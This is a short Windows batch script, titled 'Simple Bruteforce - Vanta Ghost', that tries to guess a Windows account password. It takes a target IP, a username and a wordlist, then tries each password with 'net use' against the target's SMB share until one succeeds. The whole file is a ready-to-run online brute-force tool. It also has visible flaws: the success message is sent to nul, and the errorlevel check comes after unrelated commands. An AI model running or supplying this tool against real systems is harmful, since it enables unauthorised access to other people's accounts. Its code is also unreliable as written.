@echo off
title  Simple Bruteforce - Vanta Ghost
color A
echo.
set /p ip="Enter IP Address:"
set /p user="Enter UserName:"
set /p wordlist="Enter Pasword List:"

set /a count=0
for /f %%a in (%wordlist%) do (
    echo %%a
    set pass=%%a
    call :attempt
)

echo Password Not Found! :(
pause
exit

:success
echo Password Found!: %pass% >nul 2>&1
net use  \\%ip% /d /y
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [Attempt %count%] [%pass%]
set /a count=%count%+1
echo attempt: %pass%
if %errorlevel% EQU 0  goto success